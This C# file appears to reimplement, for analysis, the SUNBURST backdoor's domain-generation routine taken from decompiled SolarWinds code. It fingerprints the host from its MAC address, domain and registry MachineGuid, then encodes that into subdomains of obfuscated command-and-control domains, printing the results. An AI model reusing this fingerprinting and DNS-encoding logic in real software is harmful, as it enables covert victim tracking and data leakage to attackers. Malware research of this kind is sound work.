using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace solarwinds
{
	public static class ZipHelper
	{
		// Token: 0x060009C3 RID: 2499 RVA: 0x000468FC File Offset: 0x00044AFC
		public static byte[] Compress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream(input))
			{
				using (MemoryStream memoryStream2 = new MemoryStream())
				{
					using (DeflateStream deflateStream = new DeflateStream(memoryStream2, CompressionMode.Compress))
					{
						memoryStream.CopyTo(deflateStream);
					}
					result = memoryStream2.ToArray();
				}
			}
			return result;
		}

		// Token: 0x060009C4 RID: 2500 RVA: 0x00046978 File Offset: 0x00044B78
		public static byte[] Decompress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream(input))
			{
				using (MemoryStream memoryStream2 = new MemoryStream())
				{
					using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Decompress))
					{
						deflateStream.CopyTo(memoryStream2);
					}
					result = memoryStream2.ToArray();
				}
			}
			return result;
		}

		// Token: 0x060009C5 RID: 2501 RVA: 0x000469F4 File Offset: 0x00044BF4
		public static string Zip(string input)
		{
			if (string.IsNullOrEmpty(input))
			{
				return input;
			}
			string result;
			try
			{
				result = Convert.ToBase64String(ZipHelper.Compress(Encoding.UTF8.GetBytes(input)));
			}
			catch (Exception)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x060009C6 RID: 2502 RVA: 0x00046A40 File Offset: 0x00044C40
		public static string Unzip(string input)
		{
			if (string.IsNullOrEmpty(input))
			{
				return input;
			}
			string result;
			try
			{
				byte[] bytes = ZipHelper.Decompress(Convert.FromBase64String(input));
				result = Encoding.UTF8.GetString(bytes);
			}
			catch (Exception)
			{
				result = input;
			}
			return result;
		}
	}
	public class CryptoHelper
	{
		private string dnStr;
		private int offset;
		private int nCount;
		private readonly byte[] guid;
		public static byte[] userId = null;
		private string dnStrLower;

		// Token: 0x060009B0 RID: 2480 RVA: 0x00045EE8 File Offset: 0x000440E8
		public CryptoHelper(byte[] userId, string domain)
		{
			this.guid = Enumerable.ToArray<byte>(userId);
			this.dnStr = CryptoHelper.DecryptShort(domain);
			this.offset = 0;
			this.nCount = 0;
		}
		private static string DecryptShort(string domain)
		{
			if (Enumerable.All<char>(domain, (char c) => Enumerable.Contains<char>(ZipHelper.Unzip("MzA0MjYxNTO3sExMSk5JTUvPyMzKzsnNyy8oLCouKS0rr6is0o3XAwA="), c)))
			{
				return CryptoHelper.Base64Decode(domain);
			}
			return "00" + CryptoHelper.Base64Encode(Encoding.UTF8.GetBytes(domain), false);
		}
		public string GetPreviousString(out bool last)
		{
			Console.WriteLine($"GetPreviousString() Function:");
			//Console.WriteLine($"guid: {BitConverter.ToString(this.guid).Replace("-", "")}");
			string text = CryptoHelper.CreateSecureString(this.guid, true);
			Console.WriteLine($"Base64 + XOR'd Guid: {text}");

			int num = 32 - text.Length - 1;
			string result = "";
			last = false;
			if (this.offset >= this.dnStr.Length || this.nCount > 36)
			{
				return result;
			}  

			int num2 = Math.Min(num, this.dnStr.Length - this.offset);
			this.dnStrLower = this.dnStr.Substring(this.offset, num2);
			//Console.WriteLine($"Extracted dnStrLower: {this.dnStrLower}");

			this.offset += num2;
			if (Enumerable.Contains<char>(ZipHelper.Unzip("0403AAA="), this.dnStrLower[this.dnStrLower.Length - 1]))
			{
				if (num2 == num)
				{
					this.offset--;
					this.dnStrLower = this.dnStrLower.Remove(this.dnStrLower.Length - 1);
				}
				this.dnStrLower += "0";
			}
			if (this.offset >= this.dnStr.Length || this.nCount > 36)
			{
				this.nCount = -1;
			}
			result = text + CryptoHelper.CreateString(this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
			Console.WriteLine($"Constructed result string: {result}");

			if (this.nCount >= 0)
			{
				this.nCount++;
			}
			last = (this.nCount < 0);
			return result;
		}
		// Token: 0x060009B1 RID: 2481 RVA: 0x00045F18 File Offset: 0x00044118
		private static string Base64Decode(string s)
		{
			string text = ZipHelper.Unzip("Kyo0Ti9OzCkxKzXMrEyryi8wNTdKMbFMyquwSC7LzU4tz8gCAA==");
			string text2 = ZipHelper.Unzip("M4jX1QMA");
			string text3 = "";
			Random random = new Random();
			foreach (char value in s)
			{
				int num = text2.IndexOf(value);
				text3 = ((num < 0) ? (text3 + text[(text.IndexOf(value) + 4) % text.Length].ToString()) : (text3 + text2[0].ToString() + text[num + random.Next() % (text.Length / text2.Length) * text2.Length].ToString()));
			}
			return text3;
		}

		// Token: 0x060009B2 RID: 2482 RVA: 0x00045FF0 File Offset: 0x000441F0
		private static string Base64Encode(byte[] bytes, bool rt)
		{
			string text = ZipHelper.Unzip("K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==");
			string text2 = "";
			uint num = 0U;
			int i = 0;
			foreach (byte b in bytes)
			{
				num |= (uint)((uint)b << i);
				for (i += 8; i >= 5; i -= 5)
				{
					text2 += text[(int)(num & 31U)].ToString();
					num >>= 5;
				}
			}
			if (i > 0)
			{
				if (rt)
				{
					num |= (uint)((uint)new Random().Next() << i);
				}
				text2 += text[(int)(num & 31U)].ToString();
			}
			return text2;
		}
		public string GetCurrentString()
		{
			string text = CryptoHelper.CreateSecureString(this.guid, true);
			return text + CryptoHelper.CreateString((this.nCount > 0) ? (this.nCount - 1) : this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
		}
		private static string CreateSecureString(byte[] data, bool flag)
		{
			//Console.WriteLine($"CreateSecureString() Function:");
			byte[] array = new byte[data.Length + 1];
			array[0] = (byte)new Random().Next(1, 127);
			if (flag)
			{
				byte[] array2 = array;
				int num = 0;
				array2[num] |= 128;
			}
			for (int i = 1; i < array.Length; i++)
			{
				array[i] = ((byte)(data[i - 1] ^ array[0]));
			}
			return CryptoHelper.Base64Encode(array, true);
		}

		private static string CreateString(int n, char c)
		{
			if (n < 0 || n >= 36)
			{
				n = 35;
			}
			n = (n + (int)c) % 36;
			if (n < 10)
			{
				return ((char)(48 + n)).ToString();
			}
			return ((char)(97 + n - 10)).ToString();
		}

		private static readonly string apiHost = ZipHelper.Unzip("SyzI1CvOz0ksKs/MSynWS87PBQA=");

		// Token: 0x04000032 RID: 50
		private static readonly string domain1 = ZipHelper.Unzip("SywrLstNzskvTdFLzs8FAA==");

		// Token: 0x04000033 RID: 51
		private static readonly string domain2 = ZipHelper.Unzip("SywoKK7MS9ZNLMgEAA==");
		private static readonly string[] domain3 = new string[]
		{
			ZipHelper.Unzip("Sy3VLU8tLtE1BAA="),
			ZipHelper.Unzip("Ky3WLU8tLtE1AgA="),
			ZipHelper.Unzip("Ky3WTU0sLtE1BAA="),
			ZipHelper.Unzip("Ky3WTU0sLtE1AgA=")
		};
		private string GetStatus()
		{
			return string.Concat(new string[]
			{
					".",
					domain2,
					".",
					domain3[(int)this.guid[0] % domain3.Length],
					".",
					domain1
			});
		}
		private static string ReadDeviceInfo()
		{
			// Get all network interfaces
			var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

			// Filter for operational interfaces that are not loopback
			var activeInterfaces = networkInterfaces
				.Where(nic => nic.OperationalStatus == OperationalStatus.Up
							&& nic.NetworkInterfaceType != NetworkInterfaceType.Loopback);

			// Select the physical address of the first active interface
			string macAddress = activeInterfaces
				.Select(nic => nic.GetPhysicalAddress().ToString())
				.FirstOrDefault();

			return macAddress;
		}
		public static string domain4 = null;


		public static class RegistryHelper
		{
			// Token: 0x06000966 RID: 2406 RVA: 0x00042A60 File Offset: 0x00040C60
			private static RegistryHive GetHive(string key, out string subKey)
			{
				string[] array = key.Split(new char[]
				{
					'\\'
				}, 2);
				string a = array[0].ToUpper();
				subKey = ((array.Length <= 1) ? "" : array[1]);
				if (a == ZipHelper.Unzip("8/B2jYx39nEMDnYNjg/y9w8BAA==") || a == ZipHelper.Unzip("8/B2DgIA"))
				{
					return RegistryHive.ClassesRoot;
				}
				if (a == ZipHelper.Unzip("8/B2jYx3Dg0KcvULiQ8Ndg0CAA==") || a == ZipHelper.Unzip("8/B2DgUA"))
				{
					return RegistryHive.CurrentUser;
				}
				if (a == ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzBQA=") || a == ZipHelper.Unzip("8/D28QUA"))
				{
					return RegistryHive.LocalMachine;
				}
				if (a == ZipHelper.Unzip("8/B2jYwPDXYNCgYA") || a == ZipHelper.Unzip("8/AOBQA="))
				{
					return RegistryHive.Users;
				}
				if (a == ZipHelper.Unzip("8/B2jYx3Dg0KcvULiXf293PzdAcA") || a == ZipHelper.Unzip("8/B2dgYA"))
				{
					return RegistryHive.CurrentConfig;
				}
				if (a == ZipHelper.Unzip("8/B2jYwPcA1y8/d19HN2jXdxDHEEAA==") || a == ZipHelper.Unzip("8/AOcAEA"))
				{
					return RegistryHive.PerformanceData;
				}
				if (a == ZipHelper.Unzip("8/B2jYx3ifSLd3EMcQQA") || a == ZipHelper.Unzip("8/B2cQEA"))
				{
					return RegistryHive.DynData;
				}
				return (RegistryHive)0;
			}
			private static string ByteArrayToHexString(byte[] bytes)
			{
				StringBuilder stringBuilder = new StringBuilder(bytes.Length * 2);
				foreach (byte b in bytes)
				{
					stringBuilder.AppendFormat("{0:x2}", b);
				}
				return stringBuilder.ToString();
			}

			// Token: 0x06000968 RID: 2408 RVA: 0x00042CA0 File Offset: 0x00040EA0
			public static string GetValue(string key, string valueName, object defaultValue)
			{
				string name;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						object value = registryKey2.GetValue(valueName, defaultValue);
						if (value != null)
						{
							if (value.GetType() == typeof(byte[]))
							{
								return ByteArrayToHexString((byte[])value);
							}
							if (value.GetType() == typeof(string[]))
							{
								return string.Join("\n", (string[])value);
							}
							return value.ToString();
						}
					}
				}
				return null;
			}

			// Token: 0x06000969 RID: 2409 RVA: 0x00042D68 File Offset: 0x00040F68
			public static void DeleteValue(string key, string valueName)
			{
				string name;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
					{
						registryKey2.DeleteValue(valueName, true);
					}
				}
			}

			// Token: 0x0600096A RID: 2410 RVA: 0x00042DCC File Offset: 0x00040FCC
			public static string GetSubKeyAndValueNames(string key)
			{
				string name;
				string result;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						result = string.Join("\n", registryKey2.GetSubKeyNames()) + "\n\n" + string.Join(" \n", registryKey2.GetValueNames());
					}
				}
				return result;
			}
			private static bool GetOrCreateUserID(out byte[] hash64)
			{
				string text = ReadDeviceInfo();
				Console.WriteLine($"ReadDeviceInfo: {text}");
				hash64 = new byte[8];
				Array.Clear(hash64, 0, hash64.Length);
				if (text == null)
				{
					return false;
				}
				text += domain4;
				Console.WriteLine($"Appending Domain Name: {text}");
				try
				{
					text += RegistryHelper.GetValue(ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), "");
					Console.WriteLine($"After adding HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid value : {text}");

				}
				catch
				{
				}
				//hashes
				using (MD5 md = MD5.Create())
				{
					byte[] bytes = Encoding.ASCII.GetBytes(text);
					byte[] array = md.ComputeHash(bytes);
					if (array.Length < hash64.Length)
					{
						return false;
					}
					for (int i = 0; i < array.Length; i++)
					{
						byte[] array2 = hash64;
						int num = i % hash64.Length;
						array2[num] ^= array[i];
					}
				}
				Console.WriteLine($"Final UserID: {BitConverter.ToString(hash64).Replace("-", "")}");
				return true;
			}
			class Program
			{


				static void Main(string[] args)
				{
					//DGA implementation 

					//OrionImprovementBusinessLayer.Initialize()


					//domain4
					domain4 = "cisco.com";

					Console.WriteLine("Domain4: " + domain4);


					if (GetOrCreateUserID(out userId))
                    {
						Console.WriteLine($"userID: {BitConverter.ToString(userId).Replace("-", "")}");

					}

					//OrionImprovementBusinessLayer.Update()

					CryptoHelper cryptoHelper = new CryptoHelper(userId, domain4);

					//string hostName = cryptoHelper.GetCurrentString();
					bool flag;

					//OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
					/*
					if (addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error)
					{
						hostName = cryptoHelper.GetCurrentString();
					}
					else
					{
						hostName = cryptoHelper.GetPreviousString(out flag2); // <--- will be = to this on first run
					}*/

					string hostName = cryptoHelper.GetPreviousString(out flag);

					Console.WriteLine($"Host Name: {hostName}");
					

				}
			}
		}
	}
}
